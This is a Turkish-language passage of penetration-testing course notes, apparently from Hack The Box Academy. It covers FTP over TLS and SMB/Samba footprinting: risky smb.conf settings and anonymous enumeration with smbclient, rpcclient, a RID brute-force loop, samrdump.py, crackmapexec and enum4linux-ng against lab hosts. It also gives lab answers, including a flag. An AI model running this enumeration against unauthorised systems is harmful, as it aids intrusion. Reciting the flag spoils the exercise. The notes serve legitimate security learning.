FTP sunucusu `TLS/SSL` şifreleme ile çalışıyorsa durum biraz farklı görünür. Çünkü o zaman TLS/SSL ile çalışabilen bir client'a ihtiyacımız var. Bunun için openssl client'ını kullanabilir ve FTP sunucusu ile iletişim kurabiliriz. `openssl` kullanmanın iyi yanı, `SSL` sertifikasını görebilmemizdir, bu da yardımcı olabilir.

```shell-session
M1R4CKCK@htb[/htb]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp

CONNECTED(00000003)                                                                                      
Can't use SSL_get_servername                        
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify error:num=18:self signed certificate
verify return:1

depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify return:1
---                                                 
Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
 
 i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
---
 
Server certificate

-----BEGIN CERTIFICATE-----

MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL
...SNIP...
```

Bunun nedeni, SSL sertifikasının örneğin host adını ve çoğu durumda kuruluş veya şirket için bir e-posta adresini tanımamıza izin vermesidir. Buna ek olarak, şirketin dünya çapında birkaç konumu varsa, SSL sertifikası kullanılarak da tanımlanabilen belirli konumlar için sertifikalar da oluşturulabilir.


Soru : Hedef sistemde FTP sunucusunun hangi sürümü çalışıyor? Başlığın tamamını cevap olarak gönderin.

Cevap : `InFreight FTP v1.1`

Soru : FTP sunucusunu numaralandırın ve flag.txt dosyasını bulun. İçeriğini cevap olarak gönderin.

Cevap : `HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}`

![Pasted image 20241226003838.png](/img/user/resimler/Pasted%20image%2020241226003838.png)

![Pasted image 20241226003848.png](/img/user/resimler/Pasted%20image%2020241226003848.png)

![Pasted image 20241226003901.png](/img/user/resimler/Pasted%20image%2020241226003901.png)



## **SMB**

Server Message Block (SMB), dosya ve ağ kaynaklarına erişimi düzenleyen bir client-sunucu protokolüdür. İlk olarak OS/2 işletim sistemiyle tanıtılan SMB, özellikle Windows için kullanılır ve yeni sürümlerle eski sürümler arasında uyum sağlar. Samba projesi, SMB'yi Linux ve Unix dağıtımlarında kullanarak platformlar arası iletişimi mümkün kılar. SMB, IP ağlarında TCP protokolünü kullanarak bağlantı kurmadan önce üç aşamalı bir handshake süreci gerektirir.

Bir SMB server, local dosya sisteminin keyfi bölümlerini paylaşım olarak sağlayabilir. Bu nedenle, bir client tarafından görülebilen hiyerarşi sunucudaki yapıdan kısmen bağımsızdır. Access hakları Access Control Lists (ACL) tarafından tanımlanır. Bireysel kullanıcılar veya kullanıcı grupları için çalıştırma, okuma ve full access gibi özniteliklere dayalı kontrol edilebilirler. ACL'ler paylaşımlara dayalı olarak tanımlanır ve bu nedenle sunucuda lokal olarak atanan haklara karşılık gelmez.


### **Samba**

1. **CIFS ve SMB İlişkisi**
    
    - **CIFS**, **SMB** protokolünün bir **türevidir**.
    - Orijinal olarak **Microsoft** tarafından oluşturulan SMB'nin belirli bir **uyarlamasıdır**.
2. **Samba'nın Rolü**
    
    - Samba, **CIFS ağ protokolünü** uygular ve bu sayede daha yeni **Windows sistemleriyle etkili iletişim** kurabilir.
    - Bu nedenle, SMB/CIFS olarak da adlandırılır.
3. **CIFS ve SMB Sürüm Uyumluluğu**
    
    - CIFS, genellikle **SMB sürüm 1** ile uyumlu bir protokol olarak kabul edilir.
    - Daha yeni SMB sürümleriyle çalışmak için farklı protokoller veya sürümler kullanılabilir.
4. **Bağlantı ve Port Kullanımı**
    
    - **SMB komutları**, Samba üzerinden eski bir **NetBIOS servisine** yönlendirildiğinde şu portlar kullanılır:
        - **137, 138 ve 139** numaralı TCP portları.
    - **CIFS**, yalnızca **TCP port 445** üzerinden çalışır ve NetBIOS'a ihtiyaç duymaz.
5. **Güvenlik ve Kullanım Durumu**
    
    - CIFS, SMB'nin eski bir sürümü olduğu için, modern sistemlerde güvenlik riskleri taşıyabilir.
    - Günümüzde daha yeni SMB sürümleri tercih edilmekte ve eski protokollerden uzak durulmaktadır.

Bu yapılandırma, Samba'nın hem eski hem de yeni sistemlerle uyumlu çalışmasını sağlarken, bağlantı türleri ve güvenlik önlemleri açısından farklar yaratır.

| **SMB Sürümü** | **Desteklenen Sistemler**           | **Özellikler**                                                                  |
| -------------- | ----------------------------------- | ------------------------------------------------------------------------------- |
| **CIFS**       | Windows NT 4.0                      | NetBIOS arayüzü üzerinden iletişim                                              |
| **SMB 1.0**    | Windows 2000                        | TCP üzerinden doğrudan bağlantı                                                 |
| **SMB 2.0**    | Windows Vista, Windows Server 2008  | Performans iyileştirmeleri, geliştirilmiş mesaj imzalama, önbellekleme özelliği |
| **SMB 2.1**    | Windows 7, Windows Server 2008 R2   | Kilitleme mekanizmaları                                                         |
| **SMB 3.0**    | Windows 8, Windows Server 2012      | Çoklu kanal bağlantıları, uçtan uca şifreleme, uzak depolama erişimi            |
| **SMB 3.0.2**  | Windows 8.1, Windows Server 2012 R2 |                                                                                 |
| **SMB 3.1.1**  | Windows 10, Windows Server 2016     | Bütünlük kontrolü, AES-128 şifreleme                                            |

Sürüm 3 ile Samba sunucusu bir Active Directory domain'inin tam üyesi olma yeteneğini kazanmıştır. Sürüm 4 ile Samba bir Active Directory domain controller bile sağlamaktadır.

* ***Unix Arka Plan Programları (Daemonlar)**: Samba, Active Directory domain'ine katılmak veya domain controller olarak işlev görmek için belirli processlere (daemonlara) ihtiyaç duyar. Daemonlar, arka planda çalışan programlardır ve genellikle service sağlarlar.

* ***smbd**: Bu, Samba'nın SMB sunucu daemon'udur. İlk iki işlevi sağlamak için kullanılır, bu işlevler dosya paylaşımı ve yazıcı paylaşımı gibi temel SMB hizmetleridir.

* ***nmbd**: Bu, NetBIOS mesaj bloğu daemon'udur. Bu daemon, Active Directory ile ilgili daha spesifik işlevleri yerine getirir. Örneğin, name resulation ve NetBIOS üzerinden iletişim gibi işlevler için kullanılır.

* ***SMB Hizmeti Kontrolü**: SMB hizmeti, bu iki daemon'ı (smbd ve nmbd) yönetir. Yani, Samba'nın sunduğu SMB özelliklerinin düzgün çalışabilmesi için bu daemonların birbirleriyle uyumlu bir şekilde çalışmasını sağlar.


Samba'nın hem Linux hem de Windows sistemleri için uygun olduğunu biliyoruz. Bir ağda, her host aynı **workgroup**  içinde yer alır. **Workgroup**, bir **SMB** ağında bilgisayarların ve kaynaklarının rastgele bir koleksiyonunu tanımlayan bir grup adıdır. Ağda aynı anda birden fazla workgroup bulunabilir. **IBM**, bilgisayarları ağda birleştirmek için **Network Basic Input/Output System (NetBIOS)** adlı bir **uygulama programlama arayüzü (API)** geliştirdi. **NetBIOS API**, bir uygulamanın diğer bilgisayarlarla bağlantı kurması ve veri paylaşması için bir plan sundu.

1. **Samba ve Workgroup**:
    
    - **Samba**, Linux ve Windows sistemleri arasında dosya ve yazıcı paylaşımını sağlayan bir yazılımdır.
    - Bir ağda, her bilgisayar aynı **workgroup** (çalışma grubu) içinde yer alabilir. **Workgroup**, ağdaki bilgisayarları ve paylaşımlarını tanımlayan bir grup ismidir. Aynı ağda birden fazla workgroup olabilir. Örneğin, bir ağda farklı departmanlar için farklı çalışma grupları tanımlanabilir.

2. **NetBIOS ve İsim Kaydı (Name Registration)**:
    
    - **NetBIOS** (Network Basic Input/Output System), bilgisayarlar arasında iletişim kurmak için kullanılan bir protokoldür. **IBM** tarafından geliştirilmiştir. Bu protokol, ağdaki bilgisayarların birbiriyle veri paylaşmasını sağlar.
    - **NetBIOS** ortamında, her bilgisayar ağda iletişim kurabilmek için benzersiz bir **isim** (hostname) almalıdır. Bu işlem **name registration*  adı verilen bir prosedürle yapılır. Yani, her bilgisayar ağda kendisini tanımlayan bir isme sahip olur.

3. **NetBIOS Name Server (NBNS) ve WINS**:
    
    - İsim kaydı yapmak için bir sunucu kullanılır. Buna **NetBIOS Name Server (NBNS)** denir. NBNS, ağdaki her bilgisayarın ismini kaydeden ve gerektiğinde bu isimleri çözümleyen bir sunucudur.
    - **WINS (Windows Internet Name Service)**, **NBNS**'in daha gelişmiş bir sürümüdür. WINS, ağda bilgisayar isimlerini daha verimli bir şekilde yönetir ve çözümleme işlemlerini hızlandırır.

Özetle, bu metin **Samba** yazılımının ağda nasıl çalıştığını ve **NetBIOS** protokolünün bilgisayarların ağda bir isim alarak birbirleriyle nasıl iletişim kurduğunu anlatıyor. **NetBIOS**, ağdaki her bilgisayarın bir isme sahip olmasını sağlar ve bu isimler, **NetBIOS Name Server (NBNS)** veya **WINS** tarafından yönetilir.

## Default Configuration

```shell-session
M1R4CKCK@htb[/htb]$ cat /etc/samba/smb.conf | grep -v "#\|\;" 

[global]
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   panic action = /usr/share/samba/panic-action %d

   server role = standalone server
   obey pam restrictions = yes
   unix password sync = yes

   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
```

**Global settings** (küresel ayarlar) ve yazıcılar için tanımlanmış iki **share** (paylaşım) görüyoruz. **Global settings**, mevcut **SMB server** (SMB sunucusu) için tüm **shares** üzerinde kullanılan yapılandırmayı ifade eder. Ancak, bireysel **shares** içinde **global settings** geçersiz kılınabilir ve bu, büyük olasılıkla hatalı yapılandırmalara yol açabilir. Samba'daki **shares** yapılandırmasının nasıl gerçekleştirildiğini anlamak için bazı ayarları inceleyelim.

| **Ayar**                         | **Açıklama**                                                                        |
| -------------------------------- | ----------------------------------------------------------------------------------- |
| **[sharename]**                  | Ağ paylaşımının adı.                                                                |
| **workgroup = WORKGROUP/DOMAIN** | Clientler sorgu yaptığında görünecek olan workgroup.                                |
| **path = /path/here/**           | Kullanıcının erişimine izin verilen dizin.                                          |
| **server string = STRING**       | Bağlantı başlatıldığında görünecek açıklama metni.                                  |
| **unix password sync = yes**     | UNIX şifresini SMB şifresiyle senkronize et?                                        |
| **usershare allow guests = yes** | Doğrulanmamış kullanıcıların tanımlı paylaşımı erişmesine izin ver?                 |
| **map to guest = bad user**      | Kullanıcı giriş talebi geçerli bir UNIX kullanıcısıyla eşleşmediğinde ne yapılacak? |
| **browseable = yes**             | Bu paylaşım kullanılabilir paylaşımlar listesinde gösterilsin mi?                   |
| **guest ok = yes**               | Servise şifre kullanmadan bağlanılmasına izin ver?                                  |
| **read only = yes**              | Kullanıcılara sadece dosyaları okuma izni ver?                                      |
| **create mask = 0700**           | Yeni oluşturulan dosyalar için hangi izinler ayarlanacak?                           |


## Dangerous Settings

Örnek olarak browseable = yes ayarını ele alalım. Yöneticiler olarak bu ayarı benimsersek, şirket çalışanları tek tek klasörlere içerikleriyle birlikte bakabilme rahatlığına sahip olacaktır. Birçok klasör sonuçta daha iyi organizasyon ve yapı için kullanılır. Eğer çalışan paylaşımlara göz atabiliyorsa, saldırgan da başarılı bir erişimden sonra bunu yapabilecektir.

|**Ayar**|**Açıklama**|
|---|---|
|**browseable = yes**|Mevcut paylaşımda diğer paylaşımların listelenmesine izin ver?|
|**read only = no**|Dosya oluşturulmasını ve değiştirilmesini yasakla?|
|**writable = yes**|Kullanıcıların dosya oluşturmasına ve değiştirmesine izin ver?|
|**guest ok = yes**|Şifre kullanmadan servise bağlanılmasına izin ver?|
|**enable privileges = yes**|Belirli SID'lere atanmış ayrıcalıkları dikkate al?|
|**create mask = 0777**|Yeni oluşturulan dosyalara hangi izinler atanmalı?|
|**directory mask = 0777**|Yeni oluşturulan dizinlere hangi izinler atanmalı?|
|**logon script = script.sh**|Kullanıcının girişinde hangi script çalıştırılmalı?|
|**magic script = script.sh**|Script kapatıldığında hangi script çalıştırılmalı?|
|**magic output = script.out**|Magic script'in çıktısının kaydedileceği yer neresi olmalı?|

[notes] adında bir paylaşım ve birkaç başka paylaşım daha oluşturalım ve ayarların numaralandırma sürecimizi nasıl etkilediğini görelim. Yukarıdaki ayarların tümünü kullanacağız ve bu paylaşıma uygulayacağız. Örneğin, bu ayar sadece test amaçlı olsa bile sıklıkla uygulanır. Daha sonra büyük bir departmandaki küçük bir ekibin iç bir subnet'i ise, bu ayar genellikle korunur veya sıfırlanması unutulur. Bu, tüm paylaşımlara göz atabilmemize ve hatta yüksek olasılıkla bunları indirip inceleyebilmemize yol açar.

#### Example Share

```shell-session
...SNIP...

[notes]
	comment = CheckIT
	path = /mnt/notes/

	browseable = yes
	read only = no
	writable = yes
	guest ok = yes

	enable privileges = yes
	create mask = 0777
	directory mask = 0777
```

 etc/samba/smb.conf dosyasını ihtiyaçlarımıza göre ayarladıktan sonra, sunucu üzerindeki hizmeti yeniden başlatmamız gerekir.

#### Restart Samba

```shell-session
root@samba:~# sudo systemctl restart smbd
```

Şimdi hostumuzdan smbclient komutu ile sunucunun paylaşımlarının bir listesini (-L) görüntüleyebiliriz. Mevcut kullanıcıların veya geçerli parolaların girişi olmadan anonim erişim olan null session (-N) olarak adlandırılan oturumu kullanırız.

#### SMBclient - Connecting to the Share

```shell-session
M1R4CKCK@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled -- no workgroup available
```

Sonuçtan Samba sunucusunda artık beş farklı paylaşımımız olduğunu görebiliriz. Böylece print$ ve bir IPC$ daha önce gördüğümüz gibi temel ayarda varsayılan olarak zaten dahil edilmiştir. [notes] paylaşımıyla ilgilendiğimiz için, aynı client programını kullanarak giriş yapalım ve inceleyelim. Eğer client programına aşina değilsek, başarılı bir giriş yaptıktan sonra çalıştırabileceğimiz tüm olası komutları listeleyen help komutunu kullanabiliriz.

```shell-session
M1R4CKCK@htb[/htb]$ smbclient //10.129.14.128/notes

Enter WORKGROUP\<username>'s password: 
Anonymous login successful
Try "help" to get a list of possible commands.


smb: \> help

?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!            


smb: \> ls

  .                                   D        0  Wed Sep 22 18:17:51 2021
  ..                                  D        0  Wed Sep 22 12:03:59 2021
  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021

                30313412 blocks of size 1024. 16480084 blocks available
```

İlginç dosya veya klasörleri keşfettikten sonra, get komutunu kullanarak bunları indirebiliriz. Smbclient ayrıca bağlantıyı kesmeden başında bir ünlem işareti (`!<cmd>`) kullanarak lokal sistem komutlarını çalıştırmamıza izin verir.


#### Download Files from SMB

```shell-session
smb: \> get prep-prod.txt 

getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) 
(average 8,7 KiloBytes/sec)


smb: \> !ls

prep-prod.txt


smb: \> !cat prep-prod.txt

[] check your code with the templates
[] run code-assessment.py
[] …	
```

Yönetimsel bakış açısından, smbstatus kullanarak bu bağlantıları kontrol edebiliriz. Samba sürümünün yanı sıra, client'ın kime, hangi hosttan ve hangi paylaşımdan bağlandığını da görebiliriz. Bu, özellikle diğerlerinin hala erişebileceği bir subnet'e (belki de yalıtılmış bir subnet) girdiğimizde önemlidir.

Örneğin, domain düzeyinde güvenlik ile samba sunucusu bir Windows domain'inin üyesi gibi davranır. Her domainin, genellikle parola kimlik doğrulaması sağlayan bir Windows NT sunucusu olan en az bir domain controller'ı vardır. Bu domain controller workgroup'a kesin bir parola sunucusu sağlar. Domain controller kendi NTDS.dit ve Security Authentication Module (SAM) dosyalarında kullanıcıların ve parolaların kaydını tutar ve her kullanıcı ilk kez oturum açtığında ve başka bir makinenin paylaşımına erişmek istediğinde kimliklerini doğrular.

#### Samba Status

```shell-session
root@samba:~# smbstatus

Samba version 4.11.6-Ubuntu
PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
----------------------------------------------------------------------------------------------------------------------------------------
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    

Service      pid     Machine       Connected at                     Encryption   Signing     
---------------------------------------------------------------------------------------------
notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           

No locked files
```

bu komut yalnızca sizin bağlantınızı değil, o anda Samba sunucusuna bağlanmış **tüm kullanıcıların ve cihazların** bağlantılarını gösterir.

## Footprinting the Service

#### Nmap

```shell-session
M1R4CKCK@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for sharing.inlanefreight.htb (10.129.14.128)
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.35 seconds
```

Sonuçlardan Nmap'in bize burada çok fazla şey sağlamadığını görebiliriz. Bu nedenle, SMB ile manuel olarak etkileşime girmemize ve bilgi için özel istekler göndermemize izin veren diğer araçlara başvurmalıyız. Bunun için kullanışlı araçlardan biri rpcclient. Bu MS-RPC fonksiyonlarını yerine getirmek için bir araçtır.

[Remote Procedure Call](https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/) (RPC) bir kavramdır ve bu nedenle ağlarda ve client-server mimarilerinde operasyonel ve work-share yapılarını gerçekleştirmek için merkezi bir araçtır. RPC aracılığıyla iletişim süreci, parametrelerin aktarılmasını ve bir fonksiyon değerinin geri dönüşünü içerir.


#### RPCclient

```shell-session
M1R4CKCK@htb[/htb]$ rpcclient -U "" 10.129.14.128

Enter WORKGROUP\'s password:
rpcclient $> 
```

rpcclient bize bilgi almak için SMB sunucusunda belirli fonksiyonları çalıştırabileceğimiz birçok farklı istek sunar. Tüm bu fonksiyonların tam bir listesi [rpcclient'ın man](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) sayfasında bulunabilir. 


| Sorgu                          | Açıklama                                                                        |
| ------------------------------ | ------------------------------------------------------------------------------- |
| **srvinfo**                    | Sunucu bilgilerini görüntüler.                                                  |
| **enumdomains**                | Ağda konuşlandırılmış tüm domainleri listeler.                                  |
| **querydominfo**               | Konuşlandırılmış domainlerin, sunucuların ve kullanıcıların bilgilerini sağlar. |
| **netshareenumall**            | Tüm kullanılabilir paylaşımları listeler.                                       |
| **netsharegetinfo <paylaşım>** | Belirli bir paylaşım hakkında bilgi sağlar.                                     |
| **enumdomusers**               | Tüm domain kullanıcılarını listeler.                                            |
| **queryuser <RID>**            | Belirli bir kullanıcı hakkında bilgi sağlar.                                    |

#### RPCclient - Enumeration

```shell-session
rpcclient $> srvinfo

        DEVSMB         Wk Sv PrQ Unx NT SNT DEVSM
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
		
		
rpcclient $> enumdomains

name:[DEVSMB] idx:[0x0]
name:[Builtin] idx:[0x1]


rpcclient $> querydominfo

Domain:         DEVOPS
Server:         DEVSMB
Comment:        DEVSM
Total Users:    2
Total Groups:   0
Total Aliases:  0
Sequence No:    1632361158
Force Logoff:   -1
Domain Server State:    0x1
Server Role:    ROLE_DOMAIN_PDC
Unknown 3:      0x1


rpcclient $> netshareenumall

netname: print$
        remark: Printer Drivers
        path:   C:\var\lib\samba\printers
        password:
netname: home
        remark: INFREIGHT Samba
        path:   C:\home\
        password:
netname: dev
        remark: DEVenv
        path:   C:\home\sambauser\dev\
        password:
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
netname: IPC$
        remark: IPC Service (DEVSM)
        path:   C:\tmp
        password:
		
		
rpcclient $> netsharegetinfo notes

netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        password:
        type:   0x0
        perms:  0
        max_uses:       -1
        num_uses:       1
revision: 1
type: 0x8004: SEC_DESC_DACL_PRESENT SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       1       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x00 
                Specific bits: 0x1ff
                Permissions: 0x101f01ff: Generic all access SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0
```

`rpcclient` SMB hizmetine bağlanarak **IPC$** paylaşımı veya diğer özel hizmetlere erişip bilgileri toplar.

Anonim kullanıcı erişimi, ağda brute-force saldırılarına ve zayıf yapılandırma nedeniyle diğer kullanıcıların keşfedilmesine yol açabilir.


#### Rpcclient - User Enumeration

```shell-session
rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]


rpcclient $> queryuser 0x3e9

        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
        Home Drive  :   \\devsmb\cry0l1t3
        Dir Drive   :
        Profile Path:   \\devsmb\cry0l1t3\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:50:56 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:50:56 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e9
        group_rid:      0x201
        acb_info :      0x00000014
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...


rpcclient $> queryuser 0x3e8

        User Name   :   mrb3n
        Full Name   :
        Home Drive  :   \\devsmb\mrb3n
        Dir Drive   :
        Profile Path:   \\devsmb\mrb3n\profile
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Do, 01 Jan 1970 01:00:00 CET
        Logoff Time              :      Mi, 06 Feb 2036 16:06:39 CET
        Kickoff Time             :      Mi, 06 Feb 2036 16:06:39 CET
        Password last set Time   :      Mi, 22 Sep 2021 17:47:59 CEST
        Password can change Time :      Mi, 22 Sep 2021 17:47:59 CEST
        Password must change Time:      Do, 14 Sep 30828 04:48:05 CEST
        unknown_2[0..31]...
        user_rid :      0x3e8
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x00000000
        padding1[0..7]...
        logon_hrs[0..21]...
```

Daha sonra sonuçları grubun RID'sini tanımlamak için kullanabiliriz ve bunu daha sonra tüm gruptan bilgi almak için kullanabiliriz.

#### Rpcclient - Group Information

```shell-session
rpcclient $> querygroup 0x201

        Group Name:     None
        Description:    Ordinary Users
        Group Attribute:7
        Num Members:2
```

- **Kısıtlamalar ve Komutlar**:
    - Tüm komutlar kullanılamayabilir.
    - Kullanıcı temelli kısıtlamalar uygulanabilir.

- **RID (Relative Identifier) Sorgulama**:
    - `queryuser <RID>` komutuyla genellikle RID sorgulamalarına izin verilir.
    - Hangi RID'nin hangi kullanıcıya ait olduğunu bilmeden sorgulama yapılabilir.

- **RID Brute Force**:
    - Bilinmeyen RID'leri keşfetmek için brute-force yöntemi kullanılabilir.
    - RID sorgulaması başarıyla yapıldığında kullanıcı hakkında bilgi alınabilir.

- **Araç Seçenekleri**:
    - Bu işlemler için farklı araçlar ve yöntemler kullanılabilir.
    - Örneğin, **rpcclient** kullanılarak bir ağ servisine sorgu gönderilebilir.

- **Bash ve Döngü Kullanımı**:
    - Bir **For döngüsü** oluşturarak belirli RID aralıklarını sistematik olarak sorgulamak mümkündür.
    - Bash komutları kullanılarak RPC sonuçları filtrelenip analiz edilebilir.

- **Sonuç**:
    - Bu yöntemle atanmış RID'ler ve kullanıcı bilgileri tespit edilebilir.


#### Brute Forcing User RIDs

```shell-session
M1R4CKCK@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

        User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
		
        User Name   :   mrb3n
        user_rid :      0x3e8
        group_rid:      0x201
		
        User Name   :   cry0l1t3
        user_rid :      0x3e9
        group_rid:      0x201
```

Buna alternatif olarak Impacket'in samrdump.py adlı Python scripti kullanılabilir.

#### Impacket - Samrdump.py

```shell-session
M1R4CKCK@htb[/htb]$ samrdump.py 10.129.14.128

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Retrieving endpoint list from 10.129.14.128
Found domain(s):
 . DEVSMB
 . Builtin
[*] Looking up users in domain DEVSMB
Found user: mrb3n, uid = 1000
Found user: cry0l1t3, uid = 1001
mrb3n (1000)/FullName: 
mrb3n (1000)/UserComment: 
mrb3n (1000)/PrimaryGroupId: 513
mrb3n (1000)/BadPasswordCount: 0
mrb3n (1000)/LogonCount: 0
mrb3n (1000)/PasswordLastSet: 2021-09-22 17:47:59
mrb3n (1000)/PasswordDoesNotExpire: False
mrb3n (1000)/AccountIsDisabled: False
mrb3n (1000)/ScriptPath: 
cry0l1t3 (1001)/FullName: cry0l1t3
cry0l1t3 (1001)/UserComment: 
cry0l1t3 (1001)/PrimaryGroupId: 513
cry0l1t3 (1001)/BadPasswordCount: 0
cry0l1t3 (1001)/LogonCount: 0
cry0l1t3 (1001)/PasswordLastSet: 2021-09-22 17:50:56
cry0l1t3 (1001)/PasswordDoesNotExpire: False
cry0l1t3 (1001)/AccountIsDisabled: False
cry0l1t3 (1001)/ScriptPath: 
[*] Received 2 entries.
```

Daha önce rpcclient ile elde ettiğimiz bilgiler başka araçlar kullanılarak da elde edilebilir. Örneğin, SMBMap ve CrackMapExec araçları da SMB servislerinin numaralandırılması için yaygın olarak kullanılır ve yardımcı olur.

#### SMBmap

![Pasted image 20241226133056.png](/img/user/resimler/Pasted%20image%2020241226133056.png)


#### CrackMapExec

```shell-session
M1R4CKCK@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''

SMB         10.129.14.128   445    DEVSMB           [*] Windows 6.1 Build 0 (name:DEVSMB) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.14.128   445    DEVSMB           [+] \: 
SMB         10.129.14.128   445    DEVSMB           [+] Enumerated shares
SMB         10.129.14.128   445    DEVSMB           Share           Permissions     Remark
SMB         10.129.14.128   445    DEVSMB           -----           -----------     ------
SMB         10.129.14.128   445    DEVSMB           print$                          Printer Drivers
SMB         10.129.14.128   445    DEVSMB           home                            INFREIGHT Samba
SMB         10.129.14.128   445    DEVSMB           dev                             DEVenv
SMB         10.129.14.128   445    DEVSMB           notes           READ,WRITE      CheckIT
SMB         10.129.14.128   445    DEVSMB           IPC$                            IPC Service (DEVSM)
```


Bahsetmeye değer bir başka araç da, daha eski bir araç olan enum4linux'u temel alan enum4linux-ng adlı araçtır. Bu araç, hepsi olmasa da sorguların çoğunu otomatikleştirir ve büyük miktarda bilgi döndürebilir.

#### Enum4Linux-ng - Installation

```shell-session
M1R4CKCK@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
M1R4CKCK@htb[/htb]$ cd enum4linux-ng
M1R4CKCK@htb[/htb]$ pip3 install -r requirements.txt
```

#### Enum4Linux-ng - Enumeration

```shell-session
M1R4CKCK@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A

ENUM4LINUX - next generation

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.14.128
[*] Username ......... ''
[*] Random Username .. 'juzgtcsu'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 =====================================
|    Service Scan on 10.129.14.128    |
 =====================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    NetBIOS Names and Workgroup for 10.129.14.128    |
 =====================================================
[+] Got domain/workgroup name: DEVOPS
[+] Full NetBIOS names information:
